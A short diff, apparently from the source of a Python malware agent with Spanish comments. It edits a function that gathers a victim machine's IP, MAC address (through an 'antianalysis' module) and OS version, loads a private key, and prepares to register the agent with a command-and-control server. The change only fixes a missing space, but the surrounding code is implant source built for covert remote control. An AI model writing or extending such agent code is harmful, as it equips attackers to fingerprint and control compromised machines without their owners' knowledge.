@@ -39,7 +39,7 @@ def get_agent_id(): # Obtener el agent_id desde el archivo JSON
 def register_agent():
     ip = get_ip_address() # Obtener IP  
     mac = antianalysis.get_mac_address() # Obtener MAC 
-    so = platform.system() + "" + platform.version() # Obtener S.O y versión 
+    so = platform.system() + " " + platform.version() # Obtener S.O y versión 
     private_key = load_private_key() # Cargar clave privada
     # URL para registrar agente en C2
     server_url = f"{BASE_C2_URL}/register_agent" 
